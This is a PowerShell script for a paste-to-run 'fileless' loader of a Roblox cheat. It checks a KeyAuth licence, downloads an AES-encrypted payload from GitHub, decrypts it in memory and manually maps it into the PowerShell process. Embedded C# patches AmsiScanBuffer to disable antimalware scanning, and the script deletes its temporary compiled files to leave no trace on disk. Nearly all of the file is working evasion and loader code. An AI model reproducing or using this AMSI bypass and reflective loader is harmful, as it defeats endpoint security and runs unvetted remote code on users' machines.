# ============================================================================
#  luminosity :: fileless edition
#  Paste-to-run loader. Nothing touches disk.
#
#  Flow: console key system (KeyAuth 1.3 REST) -> fetch AES key from an
#  authenticated-only global variable -> download the encrypted payload from
#  GitHub raw (public but AES-encrypted) -> decrypt in memory ->
#  manual-map into this PowerShell process -> watchdog loop re-validates the
#  session every few minutes and kills everything on a server-side revocation
#  verdict.
#
#  Dev params (not available via irm|iex - disk-run only):
#    -LocalBlob <path>  decrypt+map from a local payload.enc (no KeyAuth)
#    -NoPatch           skip the AMSI patch (debugging)
#    -TestMap           skip auth, decrypt with the local tools key, map, idle
# ============================================================================
param(
    [string]$LocalBlob = '',
    [switch]$NoPatch,
    [switch]$TestMap       # dev: skip auth, decrypt with local key, map, idle
)

# ── config ──────────────────────────────────────────────────────────────────
$KaName    = 'Luminosity-fileless'
$KaOwner   = 'HzZmPin0u1'
$KaVersion = '1.0'
$KaUrl     = 'https://keyauth.win/api/1.3/'
$VarName   = 'pl_cfg'          # AES-256 key (64 hex chars), Authenticated variable
$BlobUrl   = 'https://raw.githubusercontent.com/luminositygg/luminosity-fileless/main/payload.enc'
$WatchSecs = 300               # session re-check cadence while the cheat runs

# ── ui helpers ──────────────────────────────────────────────────────────────
$Host.UI.RawUI.WindowTitle = 'luminosity.gg'

function Write-Brand {
    Write-Host ''
    Write-Host '  =====================================' -ForegroundColor DarkMagenta
    Write-Host '   luminosity  ::  fileless edition'     -ForegroundColor Magenta
    Write-Host '  =====================================' -ForegroundColor DarkMagenta
    Write-Host ''
}
function Write-Ok([string]$m)   { Write-Host "  [+] $m" -ForegroundColor Green }
function Write-Err([string]$m)  { Write-Host "  [-] $m" -ForegroundColor Red }
function Write-Info([string]$m) { Write-Host "  [ ] $m" -ForegroundColor Gray }

# ── hwid ────────────────────────────────────────────────────────────────────
# MachineGuid: stable per-Windows-install, no admin needed, 36 chars
# (KeyAuth app requires >= 20).
$script:Hwid = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Cryptography' -ErrorAction Stop).MachineGuid

# ── keyauth client (1.3 REST, mirrors lumi_auth_host's SDK) ────────────────
$script:SessionId = ''
$script:User      = ''
$script:Expiry    = 0

function Invoke-Ka {
    param([string]$Query)
    return Invoke-RestMethod -Uri ($KaUrl + '?' + $Query) -Method Post `
        -ContentType 'application/x-www-form-urlencoded' -TimeoutSec 30
}

function Start-Session {
    $r = Invoke-Ka "type=init&ver=$KaVersion&name=$KaName&ownerid=$KaOwner"
    if (-not $r.success) { throw "app init failed: $($r.message)" }
    $script:SessionId = $r.sessionid
}

# furthest subscription expiry, unix seconds (same rule the broker uses)
function Get-FurthestExpiry($info) {
    $max = [long]0
    if ($info -and $info.subscriptions) {
        foreach ($s in @($info.subscriptions)) {
            $e = 0
            if (-not [long]::TryParse([string]$s.expiry, [ref]$e)) { continue }
            if ($e -gt $max) { $max = $e }
        }
    }
    return $max
}

function Invoke-Login {
    param([string]$U, [string]$P, [string]$Code = '')
    $r = Invoke-Ka "type=login&username=$([uri]::EscapeDataString($U))&pass=$([uri]::EscapeDataString($P))&code=$([uri]::EscapeDataString($Code))&hwid=$([uri]::EscapeDataString($script:Hwid))&sessionid=$script:SessionId&name=$KaName&ownerid=$KaOwner"
    return $r
}

function Invoke-Register {
    param([string]$U, [string]$P, [string]$Key)
    $r = Invoke-Ka "type=register&username=$([uri]::EscapeDataString($U))&pass=$([uri]::EscapeDataString($P))&key=$([uri]::EscapeDataString($Key))&email=&hwid=$([uri]::EscapeDataString($script:Hwid))&sessionid=$script:SessionId&name=$KaName&ownerid=$KaOwner"
    return $r
}

function Invoke-License {
    param([string]$Key)
    $r = Invoke-Ka "type=license&key=$([uri]::EscapeDataString($Key))&code=&hwid=$([uri]::EscapeDataString($script:Hwid))&sessionid=$script:SessionId&name=$KaName&ownerid=$KaOwner"
    return $r
}

function Test-Session {
    try {
        $r = Invoke-Ka "type=check&sessionid=$script:SessionId&name=$KaName&ownerid=$KaOwner"
        return [bool]$r.success
    } catch {
        return $true   # network fault: never a verdict (matches the loader's resilience)
    }
}

function Format-Expiry([long]$unix) {
    if ($unix -le 0) { return 'lifetime' }
    $left = $unix - [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
    if ($left -le 0) { return 'expired' }
    $d = [Math]::Floor($left / 86400)
    $h = [Math]::Floor(($left % 86400) / 3600)
    if ($d -gt 0) { return "$d d $($h) h" }
    $m = [Math]::Floor(($left % 3600) / 60)
    return "$h h $m m"
}

# ── key system ──────────────────────────────────────────────────────────────
function Show-KeySystem {
    while ($true) {
        Write-Host ''
        Write-Host '   [1] login            (username + password)' -ForegroundColor White
        Write-Host '   [2] register         (username + password + key)' -ForegroundColor White
        Write-Host '   [3] license key' -ForegroundColor White
        Write-Host '   [4] exit' -ForegroundColor White
        $choice = "$(Read-Host '   choice')".Trim()

        if ($choice -eq '4') { return $false }

        if ($choice -eq '1') {
            $u = "$(Read-Host '   username')".Trim()
            $p = "$(Read-Host '   password')".Trim()
            if (-not $u -or -not $p) { Write-Err 'fill in every field.'; continue }
            try { $r = Invoke-Login -U $u -P $p } catch { Write-Err 'connection failed - try again.'; continue }
            if ($r.success) {
                $script:User = $u; $script:Expiry = Get-FurthestExpiry $r.info
                return $true
            }
            if ($r.message -match '2fa') {
                $code = "$(Read-Host '   2FA code')".Trim()
                try { $r = Invoke-Login -U $u -P $p -Code $code } catch { Write-Err 'connection failed - try again.'; continue }
                if ($r.success) {
                    $script:User = $u; $script:Expiry = Get-FurthestExpiry $r.info
                    return $true
                }
            }
            Write-Err $r.message
            continue
        }

        if ($choice -eq '2') {
            $u = "$(Read-Host '   username')".Trim()
            $p = "$(Read-Host '   password')".Trim()
            $k = "$(Read-Host '   key')".Trim()
            if (-not $u -or -not $p -or -not $k) { Write-Err 'fill in every field.'; continue }
            try { $r = Invoke-Register -U $u -P $p -Key $k } catch { Write-Err 'connection failed - try again.'; continue }
            if ($r.success) {
                $script:User = $u; $script:Expiry = Get-FurthestExpiry $r.info
                return $true
            }
            Write-Err $r.message
            continue
        }

        if ($choice -eq '3') {
            $k = "$(Read-Host '   key')".Trim()
            if (-not $k) { Write-Err 'enter a key.'; continue }
            try { $r = Invoke-License -Key $k } catch { Write-Err 'connection failed - try again.'; continue }
            if ($r.success) {
                $script:User = $k; $script:Expiry = Get-FurthestExpiry $r.info
                return $true
            }
            Write-Err $r.message
            continue
        }
    }
}

# ============================================================================
#  native shim: AMSI patch + manual PE mapper  (C# 5 - compiles on PS 5.1)
# ============================================================================
$csShim = @'
using System;
using System.Runtime.InteropServices;

namespace Lum
{
    public static class Native
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAlloc(IntPtr addr, UIntPtr size, uint alloc, uint protect);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualProtect(IntPtr addr, UIntPtr size, uint protect, out uint old);
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        private static extern IntPtr LoadLibraryA(string name);
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi, EntryPoint = "GetProcAddress")]
        private static extern IntPtr GetProcAddressName(IntPtr mod, string name);
        [DllImport("kernel32.dll", SetLastError = true, EntryPoint = "GetProcAddress")]
        private static extern IntPtr GetProcAddressOrd(IntPtr mod, IntPtr ordinal);
        [DllImport("ntdll.dll")]
        private static extern uint RtlAddFunctionTable(IntPtr table, ulong count, IntPtr imageBase);

        public delegate int DllMainDelegate(IntPtr instance, uint reason, IntPtr reserved);
        public delegate void TlsCallback(IntPtr instance, uint reason, IntPtr reserved);

        // amsi.dll!AmsiScanBuffer -> mov eax, 0x80070057 ; ret  (scan never runs)
        public static bool PatchAmsi()
        {
            IntPtr amsi = LoadLibraryA("amsi.dll");
            if (amsi == IntPtr.Zero) return false;
            IntPtr proc = GetProcAddressName(amsi, "AmsiScanBuffer");
            if (proc == IntPtr.Zero) return false;
            byte[] patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            uint old;
            if (!VirtualProtect(proc, (UIntPtr)patch.Length, 0x40, out old)) return false;
            Marshal.Copy(patch, 0, proc, patch.Length);
            uint ignore;
            VirtualProtect(proc, (UIntPtr)patch.Length, old, out ignore);
            return true;
        }

        private static int Dir(byte[] pe, int dirOff, int index, out int size)
        {
            int rva = BitConverter.ToInt32(pe, dirOff + index * 8);
            size = BitConverter.ToInt32(pe, dirOff + index * 8 + 4);
            return rva;
        }

        private static void Write64(byte[] image, int rva, ulong value)
        {
            byte[] b = BitConverter.GetBytes(value);
            Buffer.BlockCopy(b, 0, image, rva, 8);
        }

        private static string ZString(byte[] image, int rva)
        {
            int end = rva;
            while (image[end] != 0) end++;
            return System.Text.Encoding.ASCII.GetString(image, rva, end - rva);
        }

        // Manual-map a PE32+ DLL image and run its entry (CRT startup -> DllMain).
        // Returns the image base as ulong.
        public static ulong Map(byte[] pe)
        {
            int eLfanew = BitConverter.ToInt32(pe, 0x3C);
            ushort machine = BitConverter.ToUInt16(pe, eLfanew + 4);
            if (machine != 0x8664) throw new Exception("payload is not x64");
            ushort numSections = BitConverter.ToUInt16(pe, eLfanew + 6);
            ushort sizeOfOpt = BitConverter.ToUInt16(pe, eLfanew + 20);
            int optOff = eLfanew + 24;
            if (BitConverter.ToUInt16(pe, optOff) != 0x20B) throw new Exception("payload is not PE32+");
            uint sizeOfImage = BitConverter.ToUInt32(pe, optOff + 56);
            uint sizeOfHeaders = BitConverter.ToUInt32(pe, optOff + 60);
            ulong preferredBase = BitConverter.ToUInt64(pe, optOff + 24);
            uint entryRva = BitConverter.ToUInt32(pe, optOff + 16);
            int numDirs = BitConverter.ToInt32(pe, optOff + 108);
            int dirOff = optOff + 112;

            IntPtr mem = VirtualAlloc(IntPtr.Zero, (UIntPtr)sizeOfImage, 0x3000, 0x40);
            if (mem == IntPtr.Zero) throw new Exception("VirtualAlloc failed");
            ulong baseAddr = (ulong)mem;
            ulong delta = baseAddr - preferredBase;

            byte[] image = new byte[sizeOfImage];
            Buffer.BlockCopy(pe, 0, image, 0, (int)sizeOfHeaders);

            int secTable = eLfanew + 24 + sizeOfOpt;
            for (int i = 0; i < numSections; i++)
            {
                int s = secTable + i * 40;
                uint vSize = BitConverter.ToUInt32(pe, s + 8);
                uint vAddr = BitConverter.ToUInt32(pe, s + 12);
                uint rSize = BitConverter.ToUInt32(pe, s + 16);
                uint rPtr = BitConverter.ToUInt32(pe, s + 20);
                int n = (int)Math.Min(vSize, rSize);
                if (n > 0) Buffer.BlockCopy(pe, (int)rPtr, image, (int)vAddr, n);
            }

            // base relocations (type 10 = DIR64)
            int relSize;
            int relRva = Dir(pe, dirOff, 5, out relSize);
            if (relRva != 0 && delta != 0)
            {
                int off = relRva;
                int end = relRva + relSize;
                while (off + 8 <= end)
                {
                    uint pageRva = BitConverter.ToUInt32(image, off);
                    uint blockSize = BitConverter.ToUInt32(image, off + 4);
                    if (blockSize == 0) break;
                    int pairs = (int)(blockSize - 8) / 2;
                    for (int i = 0; i < pairs; i++)
                    {
                        ushort e = BitConverter.ToUInt16(image, off + 8 + i * 2);
                        int type = e >> 12;
                        if (type == 10)
                        {
                            int at = (int)(pageRva + (e & 0xFFF));
                            Write64(image, at, BitConverter.ToUInt64(image, at) + delta);
                        }
                    }
                    off += (int)blockSize;
                }
            }

            // import table
            int impSize;
            int impRva = Dir(pe, dirOff, 1, out impSize);
            if (impRva != 0)
            {
                int off = impRva;
                while (true)
                {
                    uint oftRva = BitConverter.ToUInt32(image, off);
                    uint nameRva = BitConverter.ToUInt32(image, off + 12);
                    uint ftRva = BitConverter.ToUInt32(image, off + 16);
                    if (oftRva == 0 && ftRva == 0 && nameRva == 0) break;
                    string dll = ZString(image, (int)nameRva);
                    IntPtr hMod = LoadLibraryA(dll);
                    if (hMod == IntPtr.Zero) throw new Exception("LoadLibrary failed: " + dll);
                    int src = (int)(oftRva != 0 ? oftRva : ftRva);
                    int dst = (int)ftRva;
                    while (true)
                    {
                        ulong t = BitConverter.ToUInt64(image, src);
                        if (t == 0) break;
                        IntPtr fn;
                        if ((t >> 63) != 0)
                        {
                            fn = GetProcAddressOrd(hMod, (IntPtr)(t & 0xFFFF));
                        }
                        else
                        {
                            fn = GetProcAddressName(hMod, ZString(image, (int)(t & 0xFFFFFFFF) + 2));
                        }
                        if (fn == IntPtr.Zero) throw new Exception("GetProcAddress failed in " + dll);
                        Write64(image, dst, (ulong)fn);
                        src += 8;
                        dst += 8;
                    }
                    off += 20;
                }
            }

            // committed copy
            Marshal.Copy(image, 0, mem, (int)sizeOfImage);

            // x64 exception table (C++ unwinding dies without this)
            int excSize;
            int excRva = Dir(pe, dirOff, 3, out excSize);
            if (excRva != 0 && excSize > 0)
            {
                RtlAddFunctionTable(new IntPtr(mem.ToInt64() + excRva), (ulong)(excSize / 12), mem);
            }

            // TLS callbacks (address of the array is a VA - already relocated).
            // The fileless build carries an empty TLS directory; this path is a
            // no-op there but keeps the mapper correct for any future payload.
            int tlsSize;
            int tlsRva = Dir(pe, dirOff, 9, out tlsSize);
            if (tlsRva != 0 && tlsSize >= 24)
            {
                ulong callbacksVa = BitConverter.ToUInt64(image, tlsRva + 24);
                if (callbacksVa != 0)
                {
                    ulong arrayAddr = callbacksVa;
                    int guard = 0;
                    while (guard++ < 64)
                    {
                        ulong cb = (ulong)Marshal.ReadInt64(new IntPtr((long)arrayAddr));
                        if (cb == 0) break;
                        TlsCallback cbDel = (TlsCallback)Marshal.GetDelegateForFunctionPointer(
                            new IntPtr((long)cb), typeof(TlsCallback));
                        cbDel(mem, 1, IntPtr.Zero); // DLL_PROCESS_ATTACH
                        arrayAddr += 8;
                    }
                }
            }

            // entry = _DllMainCRTStartup for a /MD DLL: runs CRT init, then our
            // DllMain, which spawns the cheat thread.
            if (entryRva != 0)
            {
                DllMainDelegate entry = (DllMainDelegate)Marshal.GetDelegateForFunctionPointer(
                    new IntPtr((long)baseAddr + entryRva), typeof(DllMainDelegate));
                entry(mem, 1, IntPtr.Zero);
            }

            return baseAddr;
        }
    }
}
'@

function Install-NativeShim {
    # PS 5.1's CodeDom drops a temp assembly in %TEMP%; clean it right after
    # load so the run stays fileless. PowerShell 7 compiles in memory.
    $temp = [IO.Path]::GetTempPath()
    $before = @(Get-ChildItem $temp -Filter '*.dll' -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName)
    Add-Type -TypeDefinition $csShim -Language CSharp
    $after = @(Get-ChildItem $temp -Filter '*.dll' -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName)
    foreach ($f in $after) {
        if ($before -notcontains $f) {
            try { Remove-Item $f -Force -ErrorAction SilentlyContinue } catch {}
        }
    }
}

# ── payload ─────────────────────────────────────────────────────────────────
function Get-PayloadBlob {
    if ($LocalBlob) {
        Write-Info "dev: local blob $LocalBlob"
        return [IO.File]::ReadAllBytes($LocalBlob)
    }
    if (-not $BlobUrl) { throw "no blob url configured and no -LocalBlob given" }
    Write-Info 'downloading payload...'
    $r = Invoke-WebRequest -Uri $BlobUrl -UseBasicParsing -TimeoutSec 120
    return $r.Content
}

function ConvertFrom-Hex([string]$hex) {
    if ($hex -notmatch '^[0-9a-fA-F]{64}$') { throw 'payload key is not 64 hex chars' }
    $b = New-Object byte[] 32
    for ($i = 0; $i -lt 32; $i++) { $b[$i] = [Convert]::ToByte($hex.Substring($i * 2, 2), 16) }
    return $b
}

function Decrypt-Payload {
    param([byte[]]$Blob, [string]$KeyHex)
    $key = ConvertFrom-Hex $KeyHex
    $iv = New-Object byte[] 16
    [Array]::Copy($Blob, 0, $iv, 0, 16)
    $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $aes.KeySize = 256
    $aes.Key = $key
    $aes.IV = $iv
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $dec = $aes.CreateDecryptor()
    return $dec.TransformFinalBlock($Blob, 16, $Blob.Length - 16)
}

# ── watchdog: server-side enforcement while the cheat runs ─────────────────
# A definitive success:false (revoked / expired / banned) kills the process.
# Network faults never count as a verdict - the loader build tolerates those
# too, and killing someone mid-game over lost wifi is worse than the risk.
function Start-Watchdog {
    while ($true) {
        Start-Sleep -Seconds $WatchSecs
        $ok = Test-Session
        if (-not $ok) {
            Write-Host ''
            Write-Err 'session revoked or expired - closing.'
            Start-Sleep -Seconds 3
            Stop-Process -Id $PID -Force
        }
    }
}

# ============================================================================
#  main
# ============================================================================
Write-Brand

if ($TestMap) {
    # dev-only path: local key, no auth, no watchdog. Validates decrypt +
    # map + DLL startup mechanics. The mapped cheat waits for Roblox.
    $keyHex = (Get-Content (Join-Path $PSScriptRoot '..\tools\payload_key.txt') -Raw).Trim()
    $blobPath = if ($LocalBlob) { $LocalBlob } else { Join-Path $PSScriptRoot '..\payload\payload.enc' }
    try {
        Install-NativeShim
        if (-not $NoPatch) {
            if ([Lum.Native]::PatchAmsi()) { Write-Ok 'environment ready' }
            else { Write-Info 'environment ready (no patch needed)' }
        }
        $blob = [IO.File]::ReadAllBytes($blobPath)
        Write-Ok ("blob loaded ({0} KB)" -f [Math]::Round($blob.Length / 1KB))
        $pe = Decrypt-Payload -Blob $blob -KeyHex $keyHex
        Write-Ok ("payload decrypted ({0} KB)" -f [Math]::Round($pe.Length / 1KB))
        $base = [Lum.Native]::Map($pe)
        Write-Ok ("mapped at 0x{0:X} - cheat thread started" -f $base)
        Write-Info 'test mode: idling (no watchdog). kill this process when done.'
        while ($true) { Start-Sleep -Seconds 60 }
    } catch {
        Write-Err $_.Exception.Message
        return
    }
}

try {
    Write-Info 'connecting...'
    Start-Session
    Write-Ok 'connected'
} catch {
    Write-Err $_.Exception.Message
    Write-Host ''
    return
}

if (-not (Show-KeySystem)) { return }

Write-Ok ("welcome, {0} - subscription: {1}" -f $script:User, (Format-Expiry $script:Expiry))

# identity for the overlay watermark (read via env by the mapped image)
$env:LUM_USER   = $script:User
$env:LUM_EXPIRY = [string]$script:Expiry

# fetch the payload key: authenticated sessions only (dashboard "Authenticated" flag).
# type=var = GLOBAL variables (the dashboard's Global Variables tab); the value
# arrives in the message field. (type=getvar is the per-USER variable store.)
try {
    Write-Info 'fetching payload key...'
    $keyResp = Invoke-Ka "type=var&varid=$VarName&sessionid=$script:SessionId&name=$KaName&ownerid=$KaOwner"
    if (-not $keyResp.success) { throw "key fetch failed: $($keyResp.message)" }
    $payloadKey = [string]$keyResp.message
    if (-not $payloadKey) { throw 'key fetch returned empty' }
    Write-Ok 'payload key ready'
} catch {
    Write-Err $_.Exception.Message
    return
}

# native shim + AMSI patch (must precede anything Defender would flag)
try {
    Install-NativeShim
    if (-not $NoPatch) {
        if ([Lum.Native]::PatchAmsi()) { Write-Ok 'environment ready' }
        else { Write-Info 'environment ready (no patch needed)' }
    }
} catch {
    Write-Err "native shim failed: $($_.Exception.Message)"
    return
}

# download + decrypt + map
try {
    $blob = Get-PayloadBlob
    Write-Ok ("payload received ({0} KB)" -f [Math]::Round($blob.Length / 1KB))
    $pe = Decrypt-Payload -Blob $blob -KeyHex $payloadKey
    Write-Ok ("payload decrypted ({0} KB)" -f [Math]::Round($pe.Length / 1KB))
    $base = [Lum.Native]::Map($pe)
    Write-Ok ('loaded - waiting for Roblox. Close this window to stop everything.')
} catch {
    Write-Err $_.Exception.Message
    return
}

# the mapped image runs on its own thread; this thread enforces the license
Start-Watchdog
